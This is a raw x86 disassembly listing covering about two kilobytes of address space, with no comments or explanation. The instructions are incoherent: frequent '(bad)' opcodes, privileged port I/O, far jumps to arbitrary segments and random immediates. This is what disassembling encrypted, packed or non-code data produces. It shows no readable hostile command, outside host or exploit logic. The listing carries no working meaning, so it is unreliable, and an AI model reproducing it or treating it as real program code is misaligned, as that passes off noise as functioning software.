  40769f:	jmp    0x7eb:0x6e441c97
  4076a6:	push   ebx
  4076a7:	jmp    0xe9e7:0x2b6b012f
  4076ae:	fidiv  DWORD PTR [ebp-0xd5715b2]
  4076b4:	(bad)  
  4076b5:	out    dx,al
  4076b6:	retf   0x944e
  4076b9:	mov    edx,0xcfabec7b
  4076be:	ftst   
  4076c0:	imul   edx,ecx,0x887402f4
  4076c6:	add    esp,DWORD PTR ds:0xccec0832
  4076cc:	(bad)  
  4076ce:	sub    al,0xe6
  4076d0:	sbb    eax,0x6187dfc
  4076d5:	adc    ch,BYTE PTR [ecx+0x1d]
  4076d8:	in     eax,dx
  4076d9:	xchg   esi,eax
  4076da:	stc    
  4076db:	push   eax
  4076dc:	sub    al,0xdc
  4076de:	pop    ds
  4076df:	xor    ah,ch
  4076e1:	xchg   DWORD PTR [edx+eax*4+0x50],ebx
  4076e5:	cli    
  4076e6:	data16 xchg bl,cl
  4076e9:	popf   
  4076ea:	dec    ecx
  4076eb:	jle    0x40768d
  4076ed:	cld    
  4076ee:	les    edi,FWORD PTR [esi+0x1e]
  4076f1:	aam    0xff
  4076f3:	loop   0x4076d4
  4076f5:	jle    0x40769b
  4076f7:	push   ebx
  4076f8:	ja     0x407710
  4076fa:	jno    0x40769c
  4076fc:	das    
  4076fd:	inc    ebp
  4076fe:	scas   eax,DWORD PTR es:[edi]
  4076ff:	aaa    
  407700:	leave  
  407701:	and    al,0x9c
  407703:	js     0x4076ad
  407705:	mov    esi,0x2651a397
  40770a:	fs jp  0x407728
  40770d:	xor    al,0x6e
  40770f:	or     DWORD PTR [eax],edi
  407711:	sub    eax,0xa68bc026
  407716:	addr16 retf 0x54bc
  40771a:	pop    edi
  40771b:	cwde   
  40771c:	popf   
  40771d:	sbb    esi,DWORD PTR [ebp+0x79]
  407720:	test   BYTE PTR [edx+0x35],ah
  407723:	mov    al,ds:0x7b7d883f
  407728:	mov    ebp,0xbcf6f077
  40772d:	inc    esi
  40772e:	outs   dx,BYTE PTR ds:[esi]
  40772f:	icebp  
  407730:	xchg   esi,eax
  407731:	xor    eax,0x3dec53e3
  407736:	xor    DWORD PTR [esi-0x1e33a277],esp
  40773c:	test   DWORD PTR [edi-0x15ccedb1],edx
  407742:	popa   
  407743:	mov    es,WORD PTR [ebx]
  407745:	ja     0x407730
  407747:	aas    
  407748:	jns    0x4077a2
  40774a:	mov    ds:0xcde9ac31,al
  40774f:	cmp    DWORD PTR [ecx-0x512ba91a],edx
  407755:	test   eax,0x198dd19f
  40775a:	std    
  40775b:	and    DWORD PTR [eax],edx
  40775d:	dec    esp
  40775e:	lahf   
  40775f:	xor    al,0xaa
  407761:	xor    esi,DWORD PTR [ebp-0x21]
  407764:	ins    BYTE PTR es:[edi],dx
  407765:	inc    eax
  407766:	in     eax,dx
  407767:	push   esp
  407768:	lds    ebp,FWORD PTR [esp+eax*8+0x2b]
  40776c:	sub    DWORD PTR [ecx-0x73],eax
  40776f:	add    BYTE PTR [ecx+0xe56a5ae],dh
  407775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407776:	inc    ebp
  407777:	adc    al,0x2d
  407779:	pop    ebx
  40777a:	jbe    0x407724
  40777c:	push   eax
  40777d:	pop    ebx
  40777e:	fisub  DWORD PTR [ebx+0x1f426092]
  407784:	pop    ebx
  407785:	dec    ebx
  407786:	cmc    
  407787:	mov    dl,0x54
  407789:	leave  
  40778a:	arpl   WORD PTR ds:0x5defda49,dx
  407790:	in     eax,dx
  407791:	sbb    DWORD PTR [eax-0x7a104377],esi
  407797:	push   edx
  407798:	aam    0xa3
  40779a:	cdq    
  40779b:	data16 fist DWORD PTR [ebx-0x31]
  40779f:	jo     0x407794
  4077a1:	js     0x407737
  4077a3:	addr16 call 0xa4f6e44b
  4077a9:	xchg   edx,eax
  4077aa:	jnp    0x407808
  4077ac:	sub    eax,DWORD PTR [ebx+eax*1-0x3b]
  4077b0:	sbb    ch,cl
  4077b2:	int    0x5a
  4077b4:	mov    esi,0xe3c3e30a
  4077b9:	push   cs
  4077ba:	rol    DWORD PTR [eax-0x600944a6],0x46
  4077c1:	fild   WORD PTR [ebx]
  4077c3:	mov    eax,0xd6bbc19
  4077c8:	daa    
  4077c9:	sub    esi,DWORD PTR [ebx+0x2d]
  4077cc:	xlat   BYTE PTR ds:[ebx]
  4077cd:	adc    ecx,ecx
  4077cf:	dec    ebp
  4077d0:	cmp    eax,0x7074fc69
  4077d5:	dec    ecx
  4077d6:	daa    
  4077d7:	add    eax,0xec238ff0
  4077dc:	das    
  4077dd:	xchg   esp,eax
  4077de:	ret    
  4077df:	(bad)  
  4077e0:	cld    
  4077e1:	push   edi
  4077e2:	add    dh,cl
  4077e4:	cmp    dh,cl
  4077e6:	shl    BYTE PTR [ebp-0x63],cl
  4077e9:	bound  edi,QWORD PTR [ebx+0x7f3f398d]
  4077ef:	inc    esp
  4077f0:	repz fdivr QWORD PTR [ebp+0x6a]
  4077f4:	sbb    BYTE PTR [edx+eiz*2+0x44f31150],dl
  4077fb:	daa    
  4077fc:	nop
  4077fd:	mov    cl,0x5f
  4077ff:	sahf   
  407800:	lds    eax,FWORD PTR es:[esp+eax*1-0x42]
  407805:	lea    esp,[ecx+0x3adf3ba0]
  40780b:	inc    ebx
  40780c:	ds out dx,eax
  40780e:	push   ebx
  40780f:	cmp    DWORD PTR [eax-0x5d],eax
  407812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407813:	mov    cl,0xdd
  407815:	out    0xca,al
  407817:	mov    BYTE PTR [esi],al
  407819:	in     eax,dx
  40781a:	jmp    0xb571:0x8bd7bd72
  407821:	cmp    bl,BYTE PTR [edx]
  407823:	(bad)  
  407824:	(bad)  
  407825:	retf   0x273b
  407828:	sti    
  407829:	rol    BYTE PTR [ebx-0xf],0x53
  40782d:	aam    0xfb
  40782f:	hlt    
  407830:	jl     0x407835
  407832:	inc    sp
  407834:	sbb    eax,0xb7a15d3b
  407839:	pushf  
  40783a:	test   eax,0x48edc728
  40783f:	pop    ds
  407840:	inc    esi
  407841:	mov    DWORD PTR [ebp+0x6b1f81e0],ebp
  407847:	test   eax,0xbd772e2
  40784d:	jnp    0x40782f
  40784f:	jmp    0x10b6:0xe91fb85d
  407856:	xor    DWORD PTR [esi],0xc18d961e
  40785c:	pop    es
  40785d:	aas    
  40785e:	inc    esp
  40785f:	dec    ebx
  407860:	fistp  WORD PTR [eax+0x56]
  407863:	pushf  
  407864:	dec    esi
  407865:	arpl   WORD PTR [ecx],ax
  407867:	in     al,0xa5
  407869:	rcr    BYTE PTR [ecx-0x32],1
  40786c:	sub    bl,BYTE PTR [ecx]
  40786e:	dec    ebp
  40786f:	stc    
  407870:	inc    esi
  407871:	shl    cl,1
  407873:	(bad)  
  407874:	std    
  407875:	dec    esp
  407876:	repz clc 
  407878:	fidiv  WORD PTR [esi]
  40787a:	not    BYTE PTR [esi+ecx*2]
  40787d:	test   al,0x5b
  40787f:	or     eax,0x55c829bd
  407884:	xlat   BYTE PTR ds:[ebx]
  407885:	add    dh,BYTE PTR [ebp-0x6804cc62]
  40788b:	lods   al,BYTE PTR ds:[esi]
  40788c:	lea    ecx,[ecx]
  40788e:	push   edi
  40788f:	mov    ch,0x9e
  407891:	int    0xbb
  407893:	jno    0x4078d8
  407895:	retf   
  407896:	push   ecx
  407897:	jp     0x407821
  407899:	jns    0x40789f
  40789b:	and    BYTE PTR ds:0x9d994dcd,cl
  4078a1:	fisub  WORD PTR [ebx+0x7a]
  4078a4:	mov    ds:0xb88d13b3,eax
  4078a9:	sub    ebx,DWORD PTR [ebp-0x7354ea1e]
  4078af:	in     al,0xc8
  4078b1:	sti    
  4078b2:	popa   
  4078b3:	repnz and ch,BYTE PTR [edx-0x1e1454b3]
  4078ba:	or     BYTE PTR [ebx+0x3127cab9],ch
  4078c0:	bound  ecx,QWORD PTR [edx]
  4078c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078c3:	cdq    
  4078c4:	push   esp
  4078c5:	inc    ecx
  4078c6:	popf   
  4078c7:	sti    
  4078c8:	aad    0xee
  4078ca:	js     0x4078a5
  4078cc:	lock mov bh,0xe1
  4078cf:	mov    edi,0x47a32879
  4078d4:	daa    
  4078d5:	add    al,0x24
  4078d7:	sahf   
  4078d8:	mov    eax,0x7451012e
  4078dd:	in     al,0xa9
  4078df:	stos   DWORD PTR es:[edi],eax
  4078e0:	or     eax,DWORD PTR [ebp-0xdc53686]
  4078e6:	and    al,0xe0
  4078e8:	lock adc bl,BYTE PTR ds:[ecx-0x7b494a1a]
  4078f0:	push   0xffffffe8
  4078f2:	mov    ebp,0xad57e1ab
  4078f8:	or     cl,BYTE PTR [esi]
  4078fa:	mov    ah,BYTE PTR [ebx-0x18dbd7ba]
  407900:	inc    edi
  407901:	mov    eax,0xa4f10b9d
  407906:	ret    0xae4e
  407909:	jg     0x407898
  40790b:	rol    BYTE PTR [edi+0x458bf521],0xe0
  407912:	xor    eax,esi
  407914:	jmp    0x407e1f
  407919:	xlat   BYTE PTR ds:[ebx]
  40791a:	xlat   BYTE PTR ds:[ebx]
  40791b:	iret   
  40791c:	into   
  40791d:	iret   
  40791e:	(bad)  
  40791f:	aad    0xd5
  407921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407922:	(bad)  
  407923:	in     al,dx
  407924:	in     eax,0x4
  407926:	sahf   
  407927:	xor    eax,0x78de904d
  40792c:	js     0x407998
  40792e:	jl     0x4079a8
  407930:	js     0x4078db
  407932:	inc    esi
  407933:	pop    ds
  407934:	and    bl,BYTE PTR [edx+0x40]
  407937:	mov    bh,0x97
  407939:	and    edx,0x46
  40793c:	scas   eax,DWORD PTR es:[edi]
  40793d:	inc    ecx
  40793e:	xchg   DWORD PTR [eax+0x8],eax
  407941:	inc    ebp
  407942:	ja     0x407986
  407944:	les    edx,FWORD PTR [edi+0x62]
  407947:	cmp    BYTE PTR ds:0xe7d0be7b,0xdf
  40794e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40794f:	(bad)  
  407950:	sub    ebx,edi
  407952:	das    
  407953:	sbb    esi,ebx
  407955:	loop   0x4079ae
  407957:	pop    ebp
  407958:	mov    dh,0xe1
  40795a:	ss sbb al,0x50
  40795d:	outs   dx,DWORD PTR ds:[esi]
  40795e:	xchg   esp,eax
  40795f:	les    ebp,FWORD PTR [ebx+eiz*1+0x78]
  407963:	pop    esi
  407964:	cmp    al,0xb5
  407966:	loop   0x40799d
  407968:	fwait
  407969:	ret    
  40796a:	mov    ?,WORD PTR [ebx+0x48e5ee9]
  407970:	stos   DWORD PTR es:[edi],eax
  407971:	stos   DWORD PTR es:[edi],eax
  407972:	in     eax,0x53
  407974:	dec    ebx
  407975:	cli    
  407976:	outs   dx,DWORD PTR ds:[esi]
  407977:	sti    
  407978:	out    dx,eax
  407979:	(bad)  
  40797a:	xor    ecx,DWORD PTR [esi]
  40797c:	jmp    0xc6d1:0x9b020ea8
  407983:	pop    es
  407984:	(bad)  
  407985:	pop    edi
  407986:	xor    DWORD PTR [ebx],0xd399c213
  40798c:	xor    eax,0x2daec1d8
  407991:	int3   
  407992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407993:	dec    ebp
  407994:	adc    BYTE PTR [eax],0x85
  407997:	push   edi
  407998:	aaa    
  407999:	les    esp,FWORD PTR [ebp-0x17]
  40799c:	push   edx
  40799d:	gs push ds
  40799f:	add    esi,DWORD PTR [eax+0x2540bdd5]
  4079a5:	scas   al,BYTE PTR es:[edi]
  4079a6:	sbb    bl,ah
  4079a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a9:	into   
  4079aa:	sub    DWORD PTR [edx],0x87eb595c
  4079b0:	dec    ebx
  4079b1:	dec    ebp
  4079b2:	(bad)  
  4079b3:	jecxz  0x4079f2
  4079b5:	(bad)  
  4079b6:	ins    DWORD PTR es:[edi],dx
  4079b7:	and    BYTE PTR [edx-0xb],dh
  4079ba:	rcl    DWORD PTR [edx-0x48988420],1
  4079c0:	lock jl 0x407950
  4079c3:	pop    ebp
  4079c4:	sub    dl,ch
  4079c6:	or     DWORD PTR [esi-0x2f],ebx
  4079c9:	les    ebp,FWORD PTR [edx-0x21]
  4079cc:	leave  
  4079cd:	mov    DWORD PTR [esi+0xa],ebp
  4079d0:	in     al,0x63
  4079d2:	imul   eax,DWORD PTR [ebx-0x793e58c9],0xffffffff
  4079d9:	xchg   edx,eax
  4079da:	sub    al,al
  4079dc:	fiadd  DWORD PTR [ebp+ebp*4+0x5d71bd78]
  4079e3:	pop    es
  4079e4:	xchg   esp,eax
  4079e5:	jg     0x407a5a
  4079e7:	iret   
  4079e8:	pushf  
  4079e9:	nop
  4079ea:	in     eax,0x14
  4079ec:	shl    DWORD PTR [edi],cl
  4079ee:	popa   
  4079ef:	test   al,0x1d
  4079f1:	mov    al,BYTE PTR [ebx+0x46]
  4079f4:	xor    ch,dh
  4079f6:	aaa    
  4079f7:	adc    BYTE PTR [edx+0x33a65da1],al
  4079fd:	xchg   ebx,eax
  4079fe:	mov    ebp,0x4c09aabb
  407a03:	int3   
  407a04:	ret    
  407a05:	inc    ecx
  407a06:	xchg   ebx,eax
  407a07:	pop    ebp
  407a08:	dec    eax
  407a09:	call   0x654dd407
  407a0e:	cdq    
  407a0f:	jl     0x407a57
  407a11:	and    al,0xd1
  407a13:	(bad)  
  407a14:	sbb    al,BYTE PTR [eax*1+0x2c62d511]
  407a1b:	push   ebp
  407a1c:	dec    esi
  407a1d:	mov    edi,0x29cc513
  407a22:	pop    es
  407a23:	call   DWORD PTR [ecx-0x6c05f6e6]
  407a29:	adc    edi,DWORD PTR [edi-0x3]
  407a2c:	int    0x48
  407a2e:	jo     0x407a5e
  407a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a31:	jb     0x407a7e
  407a33:	ss int3 
  407a35:	push   ds
  407a36:	inc    ecx
  407a37:	adc    DWORD PTR [esp+ebx*2],esp
  407a3a:	popa   
  407a3b:	mov    ebx,0xe039534b
  407a40:	call   0xc16786f
  407a45:	js     0x407a24
  407a47:	test   BYTE PTR ds:0x53e3392e,bh
  407a4d:	pop    eax
  407a4e:	add    ebp,DWORD PTR [ebp-0x589197bc]
  407a54:	cmp    BYTE PTR [ebp+0x55c76e1c],dl
  407a5a:	call   DWORD PTR [ebx]
  407a5c:	or     esp,DWORD PTR [edx-0x63]
  407a5f:	jb     0x407a42
  407a61:	jl     0x407a11
  407a63:	xchg   ebx,eax
  407a64:	fs stos DWORD PTR es:[edi],eax
  407a66:	dec    edi
  407a67:	cmp    BYTE PTR [edi+0x52244aa],dl
  407a6d:	sub    DWORD PTR [eax],esp
  407a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a70:	sbb    al,0xce
  407a72:	pop    es
  407a73:	push   ds
  407a74:	mov    cl,0x57
  407a76:	lds    ebp,FWORD PTR cs:[esi+0x4648efe7]
  407a7d:	sbb    eax,0xb717d53d
  407a82:	gs push ebx
  407a84:	xchg   ebp,eax
  407a85:	out    dx,al
  407a86:	ror    bl,1
  407a88:	and    DWORD PTR [ebx+0x7d406a6a],edi
  407a8e:	and    eax,DWORD PTR [esi+0x5228d1ec]
  407a94:	inc    eax
  407a95:	adc    al,BYTE PTR [ecx]
  407a97:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a99:	cdq    
  407a9a:	fwait
  407a9b:	mov    dl,0xce
  407a9d:	scas   al,BYTE PTR es:[edi]
  407a9e:	ret    
  407a9f:	jnp    0x407a6b
  407aa1:	(bad)  
  407aa3:	mov    al,0xce
  407aa5:	ret    
  407aa6:	mov    ecx,0x8c9e8f5d
  407aab:	push   ebx
  407aac:	mov    bl,0x47
  407aae:	inc    ebp
  407aaf:	mov    esp,0xc5300845
  407ab4:	sbb    DWORD PTR [ebp+0x500229f2],esi
  407aba:	sub    eax,0x53ab8520
  407abf:	fstp   DWORD PTR [ecx+0x3a827e4e]
  407ac5:	scas   eax,DWORD PTR es:[edi]
  407ac6:	jne    0x407a51
  407ac8:	popf   
  407ac9:	inc    ecx
  407aca:	mov    ?,WORD PTR [eax-0x21]
  407acd:	and    eax,0x7dca0ff0
  407ad2:	jecxz  0x407aae
  407ad4:	sbb    eax,0x221a58c1
  407ad9:	push   0xffffff88
  407adb:	xchg   ecx,eax
  407adc:	shl    DWORD PTR ds:0xbd1631e,cl
  407ae2:	mov    esi,0x3200def7
  407ae7:	leave  
  407ae8:	sub    DWORD PTR [ecx],ebx
  407aea:	sbb    edx,DWORD PTR [edx]
  407aec:	(bad)  
  407aed:	clc    
  407aee:	jmp    0xe454:0xe1764f24
  407af5:	icebp  
  407af6:	mov    ebx,0x97a79cfb
  407afb:	stc    
  407afc:	je     0x407b52
  407afe:	mov    esp,0xce67276
  407b03:	jo     0x407b12
  407b05:	jecxz  0x407ad8
  407b07:	xor    bl,bl
  407b09:	mov    ch,0xc7
  407b0b:	push   ecx
  407b0c:	pop    esi
  407b0d:	push   cs
  407b0e:	stc    
  407b0f:	ins    BYTE PTR es:[edi],dx
  407b10:	mov    ds:0xece742b0,al
  407b15:	jne    0x407ac9
  407b17:	retf   
  407b18:	sub    eax,0x1ac552c3
  407b1d:	(bad)  
  407b1e:	dec    esp
  407b1f:	and    eax,0xba7d97bc
  407b24:	imul   ebp,DWORD PTR [esi],0x4a
  407b27:	iret   
  407b28:	mov    al,ds:0xd461f58d
  407b2d:	mov    DWORD PTR [edx-0x640c1188],esp
  407b33:	(bad)  
  407b34:	fnstsw WORD PTR [esi-0x14599ee3]
  407b3a:	(bad)  
  407b3b:	jle    0x407b4b
  407b3d:	xchg   ebx,eax
  407b3e:	out    dx,eax
  407b3f:	das    
  407b40:	pop    es
  407b41:	adc    DWORD PTR ds:0x6ded1162,ebp
  407b47:	call   DWORD PTR [ebp+0x5d]
  407b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b4b:	cmp    al,al
  407b4d:	aas    
  407b4e:	pop    ds
  407b4f:	ss pop ecx
  407b51:	sub    bl,BYTE PTR ds:0x17635e3e
  407b57:	jbe    0x407afd
  407b59:	dec    esi
  407b5a:	or     esi,ebx
  407b5c:	das    
  407b5d:	neg    BYTE PTR [edi+0x7f]
  407b60:	mov    DWORD PTR ds:0x4b25bb9e,ecx
  407b66:	push   ss
  407b67:	cld    
  407b68:	(bad)  
  407b69:	in     eax,0x45
  407b6b:	imul   edx,DWORD PTR ds:0xd08fab60,0x45980dcd
  407b75:	push   ebp
  407b76:	mov    al,0xbd
  407b78:	cmp    edx,DWORD PTR [edx+0x50]
  407b7b:	retf   0x52ac
  407b7e:	outs   dx,BYTE PTR ds:[esi]
  407b7f:	mov    eax,ds:0x5181d9d
  407b84:	movhps xmm2,QWORD PTR [ebx+ebx*2]
  407b88:	sti    
  407b89:	adc    cl,BYTE PTR [ebx-0x12453d0b]
  407b8f:	dec    ecx
  407b90:	cld    
  407b91:	or     al,0x18
  407b93:	xor    eax,0x962de071
  407b98:	int3   
  407b99:	sbb    ecx,0x735b63e2
  407b9f:	mov    edx,0x280aa32d
  407ba4:	push   ebp
  407ba5:	rcl    DWORD PTR [ecx],0x31
  407ba8:	xchg   ebp,eax
  407ba9:	or     bl,ah
  407bab:	dec    edx
  407bac:	(bad)  
  407bae:	xor    dh,BYTE PTR [edi]
  407bb0:	pop    ss
  407bb1:	cmp    DWORD PTR [edi+ecx*2-0x2c],ebp
  407bb5:	adc    DWORD PTR ds:0xa082bcc9,eax
  407bbb:	sub    ebp,esp
  407bbd:	fistp  DWORD PTR [edi-0x40]
  407bc0:	pop    eax
  407bc1:	dec    ebx
  407bc2:	mov    ah,BYTE PTR [ecx+0x46ce600f]
  407bc8:	xchg   edx,eax
  407bc9:	jecxz  0x407b85
  407bcb:	dec    ebp
  407bcc:	ret    0x8a3d
  407bcf:	pushf  
  407bd0:	out    0x33,eax
  407bd2:	nop
  407bd3:	mov    dl,0x54
  407bd5:	cmp    esi,edi
  407bd7:	xchg   ebp,eax
  407bd8:	iret   
  407bd9:	retf   
  407bda:	dec    edi
  407bdb:	(bad)  
  407bdc:	div    DWORD PTR [esi-0x25243e0c]
  407be2:	cmp    al,0x36
  407be4:	ja     0x407c23
  407be6:	mov    bl,dh
  407be8:	pushf  
  407be9:	xchg   esi,eax
  407bea:	lods   al,BYTE PTR ds:[esi]
  407beb:	fucomi st,st(5)
  407bed:	es loope 0x407c60
  407bf0:	add    ch,cl
  407bf2:	pop    ebx
  407bf3:	mov    es,ebx
  407bf5:	mov    BYTE PTR ds:0x5e986c1c,bh
  407bfb:	mov    ds:0x7a248c44,eax
  407c00:	scas   eax,DWORD PTR es:[edi]
  407c01:	(bad)  
  407c02:	loop   0x407c53
  407c04:	popf   
  407c05:	(bad)  
  407c06:	ins    DWORD PTR es:[edi],dx
  407c07:	jmp    0x407bf9
  407c09:	out    dx,al
  407c0a:	ins    BYTE PTR es:[edi],dx
  407c0b:	ja     0x407c28
  407c0d:	imul   esp,DWORD PTR [edi],0xa5f824d7
  407c13:	fisubr DWORD PTR [ebx-0x7a9fb8a9]
  407c19:	or     ebp,edx
  407c1b:	aad    0x5e
  407c1d:	sbb    ebx,ebp
  407c1f:	je     0x407bc7
  407c21:	and    ebp,0x1c33bdf
  407c27:	xor    bl,BYTE PTR [eax]
  407c29:	shr    DWORD PTR [edi+esi*8],1
  407c2c:	dec    eax
  407c2d:	in     al,0x47
  407c2f:	cli    
  407c30:	les    ecx,FWORD PTR [ebx-0x4f08f0b3]
  407c36:	iret   
  407c37:	jns    0x407c8d
  407c39:	(bad)  
  407c3a:	jmp    0x407c10
  407c3c:	mov    ds:0x40c47d34,al
  407c41:	dec    edi
  407c42:	cwde   
  407c43:	sub    ebp,esi
  407c45:	ins    DWORD PTR es:[edi],dx
  407c46:	loopne 0x407c79
  407c48:	ror    DWORD PTR [ebx-0x1429945d],0xc7
  407c4f:	scas   eax,DWORD PTR es:[edi]
  407c50:	stc    
  407c51:	jno    0x407c9d
  407c53:	push   ds
  407c54:	fldcw  WORD PTR [edi-0x1e]
  407c57:	push   0x2
  407c59:	aaa    
  407c5a:	jbe    0x407c5e
  407c5c:	ins    DWORD PTR es:[edi],dx
  407c5d:	cwde   
  407c5e:	mov    esi,0x3d72332e
  407c63:	outs   dx,DWORD PTR ds:[esi]
  407c64:	outs   dx,DWORD PTR ds:[esi]
  407c65:	in     eax,0x71
  407c67:	cmc    
  407c68:	xchg   esi,eax
  407c69:	aas    
  407c6a:	call   0x1e69:0x1becaf5d
  407c71:	mov    edx,0x904e30f2
  407c76:	dec    edi
  407c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c78:	test   al,0xa4
  407c7a:	pop    edi
  407c7b:	cmp    DWORD PTR [eax+0x6e],esp
  407c7e:	jne    0x407ccb
  407c80:	push   es
  407c81:	je     0x407c8d
  407c83:	mov    eax,ds:0xf13a1a1b
  407c88:	retf   
  407c89:	scas   eax,DWORD PTR es:[edi]
  407c8a:	inc    edx
  407c8b:	push   0xfa46411e
  407c90:	mov    cl,0x43
  407c92:	mov    ah,0x54
  407c94:	ja     0x407ca5
  407c96:	dec    esp
  407c97:	mov    bl,BYTE PTR [ecx]
  407c99:	jecxz  0x407cfc
  407c9b:	(bad)  
  407c9c:	js     0x407c30
  407c9e:	add    DWORD PTR [edx+0x14f4f159],0x52ff90be
  407ca8:	mov    eax,ds:0x6e2701c8
  407cad:	(bad)
  407cb1:	pusha  
  407cb2:	repz js 0x407cb5
  407cb5:	cmp    eax,DWORD PTR [ebp-0x38]
  407cb8:	jg     0x407cb8
  407cba:	dec    edi
  407cbb:	loopne 0x407cea
  407cbd:	or     ebx,DWORD PTR [ecx-0x35]
  407cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cc1:	push   esi
  407cc2:	(bad)  
  407cc3:	mov    esi,esp
  407cc5:	(bad)  
  407cc6:	mov    dh,0x31
  407cc8:	mov    eax,ds:0x2ff5f66d
  407ccd:	add    al,0xde
  407ccf:	mov    dh,BYTE PTR [edx-0x50]
  407cd2:	jg     0x407c87
  407cd4:	add    ecx,DWORD PTR [ebp+0x7626b7dc]
  407cda:	and    BYTE PTR [eax],bh
  407cdc:	cmp    BYTE PTR [edi+0x26],bh
  407cdf:	ror    DWORD PTR [ebp+0x3bafa9cb],1
  407ce5:	jecxz  0x407cc7
  407ce7:	ret    0xcd17
  407cea:	cmp    BYTE PTR [ebx],ch
  407cec:	stos   DWORD PTR es:[edi],eax
  407ced:	lock lock mov WORD PTR fs:[ebp-0x49],fs
  407cf3:	add    al,0xf7
  407cf5:	inc    eax
  407cf6:	pop    ecx
  407cf7:	pop    ss
  407cf8:	loope  0x407cea
  407cfa:	mov    WORD PTR [esi-0x1c],?
  407cfd:	cmp    BYTE PTR [ecx],dh
  407cff:	add    al,BYTE PTR [ebx]
  407d01:	ficom  DWORD PTR [edx-0x1e]
  407d04:	add    bh,al
  407d06:	xchg   ecx,eax
  407d07:	cs jne 0x407c9c
  407d0a:	sbb    al,0xca
  407d0c:	mov    dh,dl
  407d0e:	or     DWORD PTR [ebx+0x5e],0xffffffdf
  407d12:	push   ecx
  407d13:	push   cs
  407d14:	fisubr WORD PTR [edi-0x796d3906]
  407d1a:	xor    DWORD PTR [ebp+0x65a8b671],ecx
  407d20:	in     eax,0xa0
  407d22:	jmp    0x6c2dd155
  407d27:	inc    esi
  407d28:	fidiv  DWORD PTR [edx]
  407d2a:	xchg   BYTE PTR [ecx],dl
  407d2c:	add    edi,DWORD PTR [ebp+0x7f]
  407d2f:	imul   ecx,DWORD PTR [edi],0xfb7aacd3
  407d35:	fpatan 
  407d37:	xchg   esi,eax
  407d38:	adc    DWORD PTR [eax+0x6fb27ffb],edx
  407d3e:	push   ecx
  407d3f:	cmp    ch,bh
  407d41:	dec    ecx
  407d42:	test   al,0xd3
  407d44:	bound  edx,QWORD PTR [edi+0x20c2ad40]
  407d4a:	cmp    bh,dh
  407d4c:	push   edx
  407d4d:	mov    al,0xa4
  407d4f:	daa    
  407d50:	jnp    0x407d34
  407d52:	push   edi
  407d53:	xchg   BYTE PTR [ecx],al
  407d55:	pop    es
  407d56:	scas   eax,DWORD PTR es:[edi]
  407d57:	push   es
  407d58:	call   0x1397:0x7e3584ed
  407d5f:	pop    eax
  407d60:	adc    esi,DWORD PTR ds:0x8cdce8ee
  407d66:	enter  0x5bb8,0x0
  407d6a:	jl     0x407d76
  407d6c:	(bad)  
  407d6d:	int    0xcd
  407d6f:	lods   al,BYTE PTR ds:[esi]
  407d70:	lock or eax,DWORD PTR [ebx]
  407d73:	pop    esi
  407d74:	mov    cl,0x51
  407d76:	ins    DWORD PTR es:[edi],dx
  407d77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d78:	xchg   esi,eax
  407d79:	scas   eax,DWORD PTR es:[edi]
  407d7a:	lahf   
  407d7b:	mov    bh,0xd5
  407d7d:	cdq    
  407d7e:	xor    esi,eax
  407d80:	stos   BYTE PTR es:[edi],al
  407d81:	mov    cl,BYTE PTR [ecx-0x74]
  407d84:	cld    
  407d85:	leave  
  407d86:	inc    DWORD PTR [edi+0x21]
  407d89:	xchg   ecx,eax
  407d8a:	retf   
  407d8b:	fnstsw WORD PTR [ecx+0x62]
  407d8e:	sbb    eax,0xde3baa88
  407d93:	aam    0x79
  407d95:	mov    ah,0x9e
  407d97:	jmp    0x31931045
  407d9c:	pop    esp
  407d9d:	(bad)  
  407d9e:	mov    dl,0x70
  407da0:	outs   dx,BYTE PTR ds:[esi]
  407da1:	dec    eax
  407da2:	cdq    
  407da3:	pop    esi
  407da4:	mov    eax,ds:0x1aef242b
  407da9:	jnp    0x407d87
  407dab:	add    BYTE PTR [edi],bl
  407dad:	(bad)  
  407dae:	test   al,0x3d
  407db0:	mov    al,ds:0xefb5d799
  407db5:	push   edx
  407db6:	or     eax,DWORD PTR [edx-0x35a5fced]
  407dbc:	pop    ebx
  407dbd:	mov    edi,0x21d1e824
  407dc2:	popf   
  407dc3:	fild   QWORD PTR [edi-0x61e4eb84]
  407dc9:	test   al,0x52
  407dcb:	imul   esi,DWORD PTR [edx-0x2f56c286],0x51
  407dd2:	cdq    
  407dd3:	inc    ebx
  407dd4:	(bad)  
  407dd6:	mov    ebp,0x70cb34ea
  407ddb:	inc    ecx
  407ddc:	sub    BYTE PTR [esp+ebx*2],ch
  407ddf:	ja     0x407dab
  407de1:	int    0xd7
  407de3:	loope  0x407e04
  407de5:	imul   esp,DWORD PTR [eax-0x1271d1a8],0x398694bf
  407def:	jns    0x407e20
  407df1:	push   ss
  407df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407df3:	popa   
  407df4:	iret   
  407df5:	test   eax,0x5a74b40d
  407dfa:	dec    ebp
  407dfb:	dec    esi
  407dfc:	hlt    
  407dfd:	pop    ss
  407dfe:	in     al,0x23
  407e00:	popf   
  407e01:	sbb    edi,DWORD PTR [esi+0x57]
  407e04:	add    ebx,DWORD PTR [eax]
  407e06:	outs   dx,DWORD PTR ds:[esi]
  407e07:	jne    0x407e59
  407e09:	jno    0x407df8
  407e0b:	jmp    0xc4ce:0x820c496c
  407e12:	add    eax,0x33de0ffe
  407e17:	jns    0x407d99
  407e19:	pop    esi
  407e1a:	adc    esi,DWORD PTR [ecx]
  407e1c:	mov    dl,0x23
  407e1e:	inc    BYTE PTR [ebx]
  407e20:	(bad)  
  407e21:	jmp    0x40832c
  407e26:	rol    esp,0x3f
  407e29:	(bad)
  407e2d:	retf   
  407e2e:	aaa    
  407e2f:	aas    
  407e30:	push   ss
  407e31:	cs inc esp
